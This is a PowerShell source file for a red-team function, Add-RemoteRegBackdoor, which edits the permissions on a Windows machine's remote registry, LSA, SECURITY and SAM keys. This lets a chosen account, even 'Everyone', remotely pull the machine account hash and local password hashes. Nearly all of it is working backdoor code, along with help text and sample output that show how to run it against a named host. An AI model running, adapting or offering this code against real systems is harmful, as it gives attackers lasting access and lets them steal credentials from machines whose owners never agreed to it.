function Add-RemoteRegBackdoor {
<#
.SYNOPSIS

Implements a new remote registry backdoor that allows for the remote retrieval of
a system's machine account hash.

Author: Matt Nelson (@enigma0x3), Lee Christensen (@tifkin_), Will Schroeder (@harmj0y)
License: BSD 3-Clause  
Required Dependencies: None

.DESCRIPTION

Adds an allow ACE with our specified trustee to the following registy keys:
    -HKEY_LOCAL_MACHINE:\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg
        ^ controls access to remote registry
    -HKEY_LOCAL_MACHINE:\SYSTEM\CurrentControlSet\Control\Lsa\JD
    -HKEY_LOCAL_MACHINE:\SYSTEM\CurrentControlSet\Control\Lsa\Skew1
    -HKEY_LOCAL_MACHINE:\SYSTEM\CurrentControlSet\Control\Lsa\Data
    -HKEY_LOCAL_MACHINE:\SYSTEM\CurrentControlSet\Control\Lsa\GBG
        ^ needed to calculate the SysKey/bootkey
    -HKEY_LOCAL_MACHINE:\SECURITY key
        The following key contains the encrypted LSA key:
            HKEY_LOCAL_MACHINE:\SECURITY\Policy\PolEKList
        The following key contains the encrypted machine account hash:
            HKEY_LOCAL_MACHINE:\SECURITY\Policy\Secrets\$MACHINE.ACC\CurrVal
        Domain cached credentials are stored in subkeys here:
            HKEY_LOCAL_MACHINE:\SECURITY\Cache\*
    -HKEY_LOCAL_MACHINE:\SAM\SAM\Domains\Account
        ^ local user hashes are stored in subkeys here

Note: on some systems the LSA subkeys don't inherit permissions from their
parent container, so we have to set those explicitly :(

Combined, these malicious ACEs allow for the remote retrieval the system's computer
account hash as well as local account hashes. These hashes can be retrieved with
Get-RemoteMachineAccountHash and Get-RemoteLocalAccountHash, respectively.

.PARAMETER ComputerName

Specifies the hostname to add the backdoor trustee to.
Defaults to the localhost.

.PARAMETER Trustee

Specifies the name ('DOMAIN\user') or the SID (S-1-...) of the trustee
to add the backdoor for. Defaults to the current user.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.EXAMPLE
 
PS C:\Temp> Add-RemoteRegBackdoor -ComputerName client.external.local -Trustee 'S-1-1-0' -Verbose
VERBOSE: [client.external.local : ] Using trustee username 'Everyone'
VERBOSE: [client.external.local] Attaching to remote registry through StdRegProv
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Backdooring started for key
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Creating the trustee WMI object with user 'Everyone'
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Applying Trustee to new Ace
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Calling SetSecurityDescriptor on the key with the newly created Ace
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Backdooring completed for key
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\Lsa\JD] Backdooring started for key
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\Lsa\JD] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\Lsa\JD] Creating the trustee WMI object with user 'Everyone'
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\Lsa\JD] Applying Trustee to new Ace
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\Lsa\JD] Calling SetSecurityDescriptor on the key with the newly created Ace
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\Lsa\JD] Backdooring completed for key
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Backdooring started for key
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Creating the trustee WMI object with user 'Everyone'
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Applying Trustee to new Ace
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Calling SetSecurityDescriptor on the key with the newly created Ace
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Backdooring completed for key
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\Lsa\Data] Backdooring started for key
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\Lsa\Data] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\Lsa\Data] Creating the trustee WMI object with user 'Everyone'
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\Lsa\Data] Applying Trustee to new Ace
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\Lsa\Data] Calling SetSecurityDescriptor on the key with the newly created Ace
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\Lsa\Data] Backdooring completed for key
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Backdooring started for key
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Creating the trustee WMI object with user 'Everyone'
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Applying Trustee to new Ace
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Calling SetSecurityDescriptor on the key with the newly created Ace
VERBOSE: [client.external.local : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Backdooring completed for key
VERBOSE: [client.external.local : SECURITY\Policy] Backdooring started for key
VERBOSE: [client.external.local : SECURITY\Policy] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)
VERBOSE: [client.external.local : SECURITY\Policy] Creating the trustee WMI object with user 'Everyone'
VERBOSE: [client.external.local : SECURITY\Policy] Applying Trustee to new Ace
VERBOSE: [client.external.local : SECURITY\Policy] Calling SetSecurityDescriptor on the key with the newly created Ace
VERBOSE: [client.external.local : SECURITY\Policy] Backdooring completed for key
VERBOSE: [client.external.local : SAM\SAM\Domains\Account] Backdooring started for key
VERBOSE: [client.external.local : SAM\SAM\Domains\Account] Creating ACE wit Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)
VERBOSE: [client.external.local : SAM\SAM\Domains\Account] Creating the trustee WMI object with user 'Everyone'
VERBOSE: [client.external.local : SAM\SAM\Domains\Account] Applying Trustee to new Ace
VERBOSE: [client.external.local : SAM\SAM\Domains\Account] Calling SetSecurityDescriptor on the key with the newly created Ace
VERBOSE: [client.external.local : SAM\SAM\Domains\Account] Backdooring completed for key
VERBOSE: [client.external.local] Backdooring completed for system

ComputerName                            BackdoorTrustee
------------                            ---------------
client.external.local                   S-1-1-0

Grants 'Everyone' the ability to remotely retrieve client.external.local's
computer account hash and local account hashes.

.EXAMPLE

Add-RemoteRegBackdoor -ComputerName client.external.local -Trustee exteral\user

Grants external\user the ability to remotely retrieve client.external.local's
computer account hash and local account hashes.

.EXAMPLE

Add-RemoteRegBackdoor -ComputerName client.external.local -Trustee 'S-1-5-21-1857433065-1017388661-3096204114-1131'

Grants the given domain security identifier the ability to remotely retrieve client.external.local's
computer account hash and local account hashes.
#>
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [Parameter(Position = 1)]
        [Alias('principal', 'user', 'sid')]
        [String]
        $Trustee = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    ForEach ($Computer in $ComputerName) {

        $WmiArguments = @{
            'ComputerName' = $Computer
        }
        if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }

        # translate the trustee SID to domain\user, if needed
        $Domain, $User = $Null, $Null
        if ($Trustee -match '^S-1-.*') {
            try {
                $SID = [Security.Principal.SecurityIdentifier]$Trustee
                $UserObj = $SID.Translate([System.Security.Principal.NTAccount])
                if ($UserObj.Value -match '.+\\.+') {
                    $Domain,$User = $UserObj.Value.Split('\\')
                }
                else {
                    $User = $UserObj.Value
                }
            }
            catch {
                Write-Error "[$Computer] Error resolving trustee: $_"
                return
            }
        }
        elseif ($Trustee -match '.+\\.+') {
            $Domain,$User = $Trustee.Split('\\')
        }
        else {
            $User = $Trustee
        }

        if ((-not $User) -or ($User -eq '')) {
            Write-Error "[$Computer] Error resolving trustee '$Trustee'"
            return
        }

        Write-Verbose "[$Computer : $Key] Using trustee username '$User'"
        if ($Domain) {
            Write-Verbose "[$Computer : $Key] Using trustee domain '$Domain'"
        }

        # step 0 -> ensure remote registry is running on the remote system
        try {
            $RemoteServiceObject = Get-WMIObject -Class Win32_Service -Filter "name='RemoteRegistry'" @WmiArguments
            if ($RemoteServiceObject.State -ne 'Running') {
                Write-Verbose "[$Computer] Remote registry is not running, attempting to start"
                $Null = $RemoteServiceObject.StartService()
            }
        }
        catch {
            Write-Error "[$Computer] Error interacting with the remote registry service: $_"
            return
        }

        # step 1 -> get a remote registry provider on the system through WMI
        try {
            Write-Verbose "[$Computer] Attaching to remote registry through StdRegProv"
            # Note: we have to use the WMI StdRegProv method as [Microsoft.Win32.RegistryKey] can't be used to set ACL information on remote keys:
            #   https://social.technet.microsoft.com/Forums/windows/en-US/0beee366-ee8d-4052-b1b9-8ad9bf0f8ff0/set-remote-registry-acl-with-powershell-net?forum=winserverpowershell
            $Reg = Get-WmiObject -Namespace root/default -Class Meta_Class -Filter "__CLASS = 'StdRegProv'" @WmiArguments
        }
        catch {
            Write-Error "[$Computer] Error attaching to remote registry through StdRegProv"
            return
        }

        $Keys = @(
            'SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg',
            'SYSTEM\CurrentControlSet\Control\Lsa\JD',
            'SYSTEM\CurrentControlSet\Control\Lsa\Skew1',
            'SYSTEM\CurrentControlSet\Control\Lsa\Data',
            'SYSTEM\CurrentControlSet\Control\Lsa\GBG',
            'SECURITY',
            'SAM\SAM\Domains\Account'
        )

        ForEach($Key in $Keys) {

            Write-Verbose "[$Computer : $Key] Backdooring started for key"

            # first grab the existing security descriptor
            #   2147483650 = HKEY_LOCAL_MACHINE
            $RegSD = $Reg.GetSecurityDescriptor(2147483650, $Key).Descriptor

            Write-Verbose "[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"
            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()
            # 983103 == ALL_ACCESS
            $RegAce.AccessMask = 983103
            # 2 == OBJECT_INHERIT_ACE
            $RegAce.AceFlags = 2
            # 0x0 == 'Access Allowed'
            $RegAce.AceType = 0x0

            Write-Verbose "[$Computer : $Key] Creating the trustee WMI object with user '$User'"
            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()
            $RegTrustee.Name = $User
            if ($Domain) {
                $RegTrustee.Domain = $Domain
            }

            Write-Verbose "[$Computer : $Key] Applying Trustee to new Ace"
            $RegAce.Trustee = $RegTrustee

            # add the new ACE to the retrieved security descriptor
            $RegSD.DACL += $RegAce.PSObject.ImmediateBaseObject

            Write-Verbose "[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace"
            $Null = $Reg.SetSecurityDescriptor(2147483650, $Key, $RegSD.PSObject.ImmediateBaseObject)

            Write-Verbose "[$Computer : $Key] Backdooring completed for key"
        }

        Write-Verbose "[$Computer] Backdooring completed for system"

        $Out = New-Object PSObject  
        $Out | Add-Member Noteproperty 'ComputerName' $Computer
        $Out | Add-Member Noteproperty 'BackdoorTrustee' $Trustee
        $Out
    }
}
